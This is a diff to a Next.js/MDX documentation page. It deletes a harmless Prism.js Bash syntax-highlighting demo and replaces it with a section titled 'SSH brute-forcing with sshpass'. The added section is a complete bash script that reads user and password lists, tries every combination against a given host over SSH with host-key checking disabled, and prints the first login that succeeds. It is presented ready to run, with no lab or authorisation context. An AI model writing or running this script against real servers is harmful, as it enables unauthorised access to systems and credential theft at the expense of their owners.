@@ -55,65 +55,43 @@ import Script from 'next/script'
 
 <div className="content">
 
-# Prism.js Bash Highlighting
-
-Styled with a dark theme, line numbers, and a copy-to-clipboard button. Use <code className="inline">&lt;code class="language-bash"&gt;</code> for Bash.
-
-<div className="card">
-  <strong>Inline Bash:</strong>
-  <p>Try <code className="inline language-bash">ls -la</code> or <code className="inline language-bash">grep -R "needle" ./src</code>.</p>
-</div>
-
-## Script example
+# SSH brute-forcing with sshpass
 
 <div className="code-wrap">
 
 ```bash
-#!/usr/bin/env bash
-set -Eeuo pipefail
+#!/bin/bash
 
-# Colors
-RED=$'\033[31m'
-GREEN=$'\033[32m'
-YELLOW=$'\033[33m'
-RESET=$'\033[0m'
+# Save as ssh_brute.sh. Requires 'sshpass': sudo apt-get install sshpass
+# Create users.txt and passwords.txt
 
-log() { printf "%s[%s]%s %s\n" "$YELLOW" "$(date +%H:%M:%S)" "$RESET" "$*"; }
-ok()  { printf "%s✔%s %s\n" "$GREEN" "$RESET" "$*"; }
-err() { printf "%s✖%s %s\n" "$RED"   "$RESET" "$*" >&2; }
-
-usage() {
-  cat <<'USAGE'
-Usage: ./demo.sh [name]
-  name   Who to greet (default: world)
-USAGE
-}
-
-name=${1:-"world"}
-
-log "Starting..."
-if [[ -z "${name}" ]]; then
-  err "Name must not be empty"
-  usage
-  exit 1
+if [ -z "$1" ]; then
+   echo "Usage: ./ssh_brute.sh <host>"
+   exit 1
 fi
 
-echo "Hello, ${name}!"
-ok "Done"
-```
+HOST=$1
+USERS="users.txt"
+PASSWORDS="passwords.txt"
 
-</div>
+while read user; do
 
-## One-liners
+   while read pass; do
+     
+      echo "[*] Trying $user:$pass..."
 
-<div className="code-wrap">
+      # sshpass provides the password to the ssh command
+      # -o StrictHostKeyChecking=no prevents prompts about new hosts
+      # The 'true' command at the end just exits successfully if login works
 
-```bash
-# Find large files (>50MB) in the current repo, excluding .git
-find . -type f -size +50M -not -path "*/.git/*" -print
+      if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$HOST" "true"; then
+         echo "[+] Success! $user:$pass"
+         exit 0
+      fi
 
-# Show top 10 largest directories
-du -sh ./* | sort -hr | head -n 10
+   done < "$PASSWORDS"
+
+done < "$USERS"
 ```
 
 </div>
